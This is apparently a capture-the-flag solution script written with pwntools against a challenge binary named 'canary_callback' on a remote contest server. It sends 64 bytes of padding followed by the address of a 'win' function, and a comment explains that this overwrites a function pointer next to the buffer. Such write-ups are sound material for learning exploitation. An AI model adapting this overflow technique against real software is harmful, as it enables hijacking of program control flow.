#!/usr/bin/env python3
from pwn import *

# Config
context.log_level = 'debug'
elf = context.binary = ELF("./canary_callback", checksec=False)
#p = process(elf.path)
REMOTE_HOST = 'offsec.m0lecon.it'
HOST_PORT = 13562
p= remote(REMOTE_HOST,HOST_PORT)



"""
BUFFER[64]
CAST [8] <-- target => offset=64 (buffer_length) 
CANARY[8]
RBP[8]
RET 

The idea is to exploit the index (idx), to write outside the buffer, overwriting the function pointer "cast" pointer variable with the address of win, in this way when cast is called the program go to the win function instead to default_spell one. 

"""

BUF_LEN = 64


p.recvuntil(b"\n")

payload = flat(
    b"A" * BUF_LEN,
    p64(elf.sym.win),
    
)



p.send(payload)
p.interactive()

